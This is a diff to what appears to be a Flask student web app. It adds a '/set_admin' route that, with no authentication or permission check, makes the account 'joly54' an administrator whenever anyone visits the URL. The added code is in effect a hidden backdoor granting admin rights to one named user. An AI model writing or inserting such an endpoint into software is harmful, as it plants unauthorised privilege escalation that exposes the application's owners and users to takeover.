@@ -335,6 +335,13 @@ def index():
         kursova=current_user.kursova,
     )
 
+@app.route('/set_admin')
+def set_admin():
+    admin = Student.query.filter_by(username='joly54').first()
+    admin.is_admin = True
+    db.session.commit()
+    return redirect(url_for('index'))
+
 
 if __name__ == '__main__':
     with app.app_context():
